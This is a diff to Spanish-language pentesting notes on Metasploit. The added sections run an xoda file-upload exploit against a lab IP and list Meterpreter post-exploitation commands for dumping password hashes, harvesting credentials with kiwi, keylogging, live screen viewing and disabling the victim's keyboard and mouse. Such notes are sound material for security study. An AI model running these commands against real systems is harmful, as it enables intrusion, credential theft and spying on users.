@@ -1,8 +1,17 @@
 # Reconocimiento con Metasploit
 
-Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL 
+Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliary 
 
-## Port Scanning
+## Comandos Meterpreter 
+
+```bash 
+❯ sysinfo                 # Muestra informacion general de la maquina victima, name, OS, Kernel, etc... 
+❯ shell                   # Nos carga una shell
+	❯ /bin/bash -i       # Si no nos crea la Shell con el comando anterior, lo hacemos con este 
+
+```
+
+## Port Scan
 
 * **Auxiliary Madules:** Son usados para  ejecutar funcionalidades como escanear, descubrir y fuzzear. Podemos usar los módulos auxiliares para ejecutar escaneo de puertos tanto TCP como UDP, así como enumerar información de los servicios como FTP, SSH, HTTP, etc... También, podemos utilizar los módulos auxiliares para descubrir hosts y ejecutar escaneo de puertos en una diferente red o subred desde de obtener el acceso inicial en un sistema target. 
 
@@ -16,6 +25,18 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL
 	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
 	❯ set PORTS 1-1000
 	❯ run 
+```
+
+```bash 
+# 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ search xoda                             
+	❯ use exploit/unix/webapp/xoda_file_upload       # Usamos el exploit
+	❯ options
+	❯ set RHOSTS 192.168.1.194                       # Colocamos la IP de la maquina victima
+	❯ set TARGETURI /
+	❯ exploit                                        
 ```
 
 ## Puerto 445 SMB 
@@ -319,3 +340,33 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL
 
 ------
 
+## Comandos específicos 
+
+Dentro de la maquina podemos hacer algunos comandos específicos
+```bash 
+
+❯ load powershell            # Cargamos el modulo powershell
+❯ powershell_shell           # Nos carga una powershell 
+❯ getuid                     # Nos muestra el nombre del servidor o usuario en Windows  
+
+❯ ps                         # Mirar los procesos existentes
+❯ hashdump                   # Para dumpear los hashes del sistema, crackearlos y hacer pass-the-hash
+❯ load kiwi                  # Cargamos el modulo kiwi para poder usar 'creds_all'
+❯ creds_all                  # Recopila informacion de credenciales de todo tipo
+```
+
+## Comandos de Meterpreter dentro de la maquina victima.
+
+```bash 
+❯ help                       # Miramos el panel de ayuda
+❯ screenshot                 # Captura de pantalla del equipo
+❯ load espia                 # Cargamos el modulo 'espia' y asi poder usar el 'screengrab, screenshare'
+❯ screenshare                # Mirar el escritorio del usuario remoto en tiempo real 
+❯ uictl disable <mouse>      # Podemos desabilitar (disable, enable) algunos componentes de interface de la maquina victima como: mouse, keyboard, all 
+❯ keyscan_start              # Sniffer de pulsaciones del teclado
+❯ keyscan_dump               # Nos muestra lo que capturo por el teclado con el comando anterior
+❯ keyscan_stop               # Para el sniffer de pulsaciones del teclado
+❯ background                 # Ponemos la sesion en segundo plano 
+❯ sessions                   # Miramos las sesiones activas en segundo plano 
+❯ sessions <id>              # Migras a alguna sesion que tenemos en segundo plano
+```
